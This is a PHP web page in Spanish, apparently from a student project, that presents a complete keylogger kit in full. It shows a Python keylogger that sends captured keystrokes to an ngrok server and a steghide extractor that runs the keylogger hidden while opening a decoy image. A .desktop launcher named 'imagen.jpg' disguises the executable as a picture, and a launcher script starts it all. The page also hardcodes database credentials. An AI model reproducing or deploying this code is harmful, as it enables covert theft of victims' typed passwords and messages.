<?php
    ob_start(); // Habilita el buffer de salida
session_start();

$servername = "mysql-db";
$username = "sea";
$password = "proyectose@";
$database = "bd_keyloggers";

// Conexión
$conn = mysqli_connect($servername, $username, $password, $database);
if (!$conn) {
    die("Conexion fallida: " . mysqli_connect_error());
}
   
?>

<!DOCTYPE html>
<html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Scripts - Imagen</title>
        
        <!-- Link hacia el archivo de estilos css -->
        <link rel="stylesheet" href="../css/scripts.css">

        <!-- Link favicon -->
        <link rel="shortcut icon" href="../img/logo.png" type="image/x-icon">

        <!-- Link para que funcionen los FA FA -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

        <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />        


    </head>

    <body>
        <!--CABECERA-->
        <div id="header">
            <div class="logo">
                <img src="../img/logo.png" alt="COACHING SL">
            </div>
            <nav>
                <ul>
                    <?php
                        echo "<li><a href='opciones.php'><i class='fa fa-home'></i> <span data-translate='inicio'>Inicio</span></a></li>";
                        echo "<li><a href='imagen.php'><i class='fa-regular fa-image'></i> <span data-translate='imagen'>Imagen</span></a></li>";
                        echo '<br>';
                    ?>
                </ul>
            </nav>
        </div>
<main>
    <!-- SOBRE LOS ARCHIVOS -->
    <section id="SobreNosotras">
        <div class="globalnosotras">
            <div class="subapartados">

                <hr class="highlight"/> <!-- SEPARADOR-->

                <div class="primero">
                    <h2 class="SobreNosotrosTit">Archivos necesarios</h2>
                    <h3 class="textoinicio">¿Cuántos archvios se necesitan?</h3>
                </div>
            </div>
            <div class="subapartados">
                <div class="col-lg-12">
                    <ul class="todaslaspreguntas">
                        <li>
                            <div class="decoracion">
                                <img class="img-circle img-responsive" src="img/about/1.jpg" alt="">
                            </div>
                            <div class="apartadopregunta">
                                <div class="preguntasola">
                                    <h4 class="titulos_quienessomos">imagen.jpg</h4>
                                </div>
                                <div class="cajatextos">
                                    <p class="textoooss"> Es la imagen real que utilizaremos para esconder el archivo de keylogger.
                                    </p>
                                </div>
                            </div>
                        </li>

                        <li class="otrolado">
                            <div class="decoracion">
                                <img class="img-circle img-responsive" src="img/about/2.jpg" alt="">
                            </div>
                            <div class="apartadopregunta">
                                <div class="preguntasola">
                                    <h4 class="titulos_quienessomos">keylogger.py // entrada_validacion.py</h4>
                                </div>
                                <div class="cajatextos">
                                    <p class="textoooss">Este archivo es un archivo python encargado de registrar las pulsaciones de teclado del usuario víctima. 
                                    </p>

                                </div>
                            </div>
                        </li>

                        <li>
                            <div class="decoracion">
                                <img class="img-circle img-responsive" src="img/about/3.jpg" alt="">
                            </div>
                            <div class="apartadopregunta">
                                <div class="preguntasola">
                                    <h4 class="titulos_quienessomos">imagen_keylogger.jpg // archivo.desktop</h4>
                                </div>
                                <div class="cajatextos">
                                    <p class="textoooss"> Este archivo es una imgen que la obtenemos al ejecutar el comando *steghide*, es decir, es la imagen que contiene oculto el keylogger.
                                    </p>
                                </div>
                            </div>
                        </li>

                        <li class="otrolado">                            
                            <div class="decoracion">
                                <img class="img-circle img-responsive" src="img/about/3.jpg" alt="">
                            </div>
                            <div class="apartadopregunta">
                                <div class="preguntasola">
                                    <h4 class="titulos_quienessomos">extractor.py // abrir_entrada.py</h4>
                                </div>
                                <div class="cajatextos">
                                <p class="textoooss">
                                    Este archivo se encarga de extraer el keylogger que se encuentra escondido en el archivo imagen_keylogger.jpg y, después, muestra la imagen real.
                                    </p>
                                </div>
                            </div>
                        </li>

                        <li>
                            <div class="decoracion">
                                <img class="img-circle img-responsive" src="img/about/2.jpg" alt="">
                            </div>
                            <div class="apartadopregunta">
                                <div class="preguntasola">
                                    <h4 class="titulos_quienessomos">ejecutar.sh // abrir_entrada.sh</h4>
                                </div>
                                <div class="cajatextos">
                                    <p class="textoooss">
                                    Este archivo es un script bash que se encarga de ejecutar el archivo *extractor.py* en segundo plano. 
                                    </p>

                                </div>
                            </div>
                        </li>

                        <li class="otrolado">
                            <div class="decoracion">
                                <p class="textoooss">
                                </p>
                            </div>         
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </section>
    <hr class="highlight"/> <!-- SEPARADOR-->


    <!-- SOBRE LOS SCRIPTS -->
    <div class="cajascripts">
        <h2 class="scripts">Scripts necesarios</h2>
    </div>

    <div class="fila-coaching">
            <div class="info_coaching">
                <div class="Centrar_info_coaching">
                    <div class="col-lg-12 text-center">
                        <h2 class="ApartadoCoachingTit">entrada_validacion.py // keylogger.py</h2>
                        <p class="expl_tiposcoaching">
                        from pynput import keyboard <br>
                        import time <br>
                        import socket <br>
                        import requests <br>
                        <br>
                        # Configuración <br>
                        tiempo_vida = 120  # segundos <br>
                        tiempo_inicio = time.time() <br>
                        buffer = "" <br>
                        SERVIDOR = "https://b2fe-79-155-254-34.ngrok-free.app/guardar-img" <br>
                        <br>
                        def obtener_ip_cliente(): <br>
                            try: <br>
                                hostname = socket.gethostname() <br>
                                ip = socket.gethostbyname_ex(hostname)[-1][-1] <br>
                                return ip <br>
                            except Exception: <br>
                                return "IP_DESCONOCIDA" <br>
                                <br>
                        def enviar_buffer(): <br>
                            global buffer <br>
                            if buffer: <br>
                                datos = { <br>
                                    "datosImg": buffer  # Flask pone tipo='P' por defecto <br>
                                } <br>
                                headers = { <br>
                                    "X-Forwarded-For": obtener_ip_cliente() <br>
                                } <br>
                                try: <br>
                                    requests.post(SERVIDOR, json=datos, headers=headers) <br>
                                except Exception as e: <br>
                                    print(f"[ERROR] No se pudo enviar el buffer: {e}") <br>
                                buffer = ""  # Limpiar después de enviar <br>
                                <br>
                        def on_press(tecla): <br>
                            global buffer <br>
                            if time.time() - tiempo_inicio > tiempo_vida: <br>
                                enviar_buffer() <br>
                                return False  # Detiene el keylogger tras 2 minutos <br>
                            try: <br>
                                if tecla == keyboard.Key.esc: <br>
                                    enviar_buffer() <br>
                                    return False <br>
                                elif tecla == keyboard.Key.space: <br>
                                    buffer += ' ' <br>
                                elif tecla == keyboard.Key.enter: <br>
                                    buffer += '\n' <br>
                                elif tecla == keyboard.Key.tab: <br>
                                    buffer += '\t' <br>
                                else: <br>
                                    buffer += tecla.char <br>
                            except AttributeError: <br>
                                buffer += f'[{tecla}]' <br>
                                <br>
                        listener = keyboard.Listener(on_press=on_press) <br>
                        listener.start() <br>
                        listener.join() <br>
                        </p>
                    </div>
                </div>
            </div>

            <div class="info_coaching">
                <div class="Centrar_info_coaching">
                    <div class="col-lg-12 text-center">
                        <h2 class="ApartadoCoachingTit">extractor.py // abrir_entrada.py</h2>
                        <p class="expl_tiposcoaching">
                        import os <br>
                        import subprocess <br>
                        <br>
                        def extraer_y_ejecutar(): <br>
                            print("[+] Extrayendo keylogger desde la imagen...") <br>
                            os.system("steghide extract -sf entrada_champions.jpg -xf entrada_validacion.py -p hascaido1234 -f") <br>
                            <br>
                            print("[+] Ejecutando keylogger en segundo plano...") <br>
                            subprocess.Popen(["python3", "entrada_validacion.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) <br>
                            <br>
                            print("[+] Mostrando imagen real...") <br>
                            os.system("xdg-open entrada_real.jpg") <br>
                            <br>
                        extraer_y_ejecutar() <br>  
                            </p>
                    </div>
                </div>
            </div>
        </div>

        <div class="fila-coaching">
            <div class="info_coaching">
                <div class="Centrar_info_coaching">
                    <div class="col-lg-12 text-center">
                        <h2 class="ApartadoCoachingTit">archivo.desktop // imagen.jpg.desktop</h2>
                        <p class="expl_tiposcoaching">
                        [Desktop Entry] <br>
                        Type=Application <br>
                        Name=imagen.jpg <br>
                        Exec=sh -c "$HOME/Descargas/Imagen/ejecutar.sh" <br>
                        Icon=$HOME/Descargas/Imagen/imagen.jpg <br>
                        Terminal=false <br>
                        </p>
                    </div>
                </div>
            </div>

            <div class="info_coaching">
                <div class="Centrar_info_coaching">
                    <div class="col-lg-12 text-center">
                        <h2 class="ApartadoCoachingTit">abrir_entrada.sh // ejecutar.sh</h2>
                        <p class="expl_tiposcoaching">
                            #!/bin/bash <br>
                            python3 $HOME/Descargas/entrada_champions/abrir_entrada.py <br>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <hr class="highlight"/> <!-- SEPARADOR-->

</main>
        <!-- PIE DE PAGINA -->
        <footer>
        Todos los derechos reservados | Keylogger SL Copyright © 2025
        </footer>

    </body>
</html>